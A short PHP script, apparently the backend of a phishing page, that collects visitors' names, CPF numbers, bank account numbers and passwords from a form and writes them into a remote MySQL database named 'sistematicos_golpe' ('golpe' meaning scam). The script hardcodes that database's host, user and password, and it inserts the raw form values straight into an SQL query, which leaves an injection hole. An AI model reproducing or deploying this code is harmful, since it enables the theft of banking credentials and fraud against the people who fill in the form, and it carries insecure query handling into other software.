<?php
$host = "mysql-sistematicos.alwaysdata.net";
$user = "408157";
$pass = "pdvcafeteria";
$dbnome = "sistematicos_golpe";
$porta = "3306";
$conn = mysqli_connect($host, $user, $pass,$dbnome,$porta  );

$Nome = $_POST['nome'];
    $CPF = $_POST['cpf'];
    $numconta = $_POST['conta'];
    $senha = $_POST['senha'];

      echo 'ffgf';
 $sql = "INSERT INTO `dados`(`Nome`, `CPF`, `numconta`, `senha`) VALUES ('$Nome','$CPF','$numconta','$senha')";
$Salva = mysqli_query($conn,$sql );
     
     













?>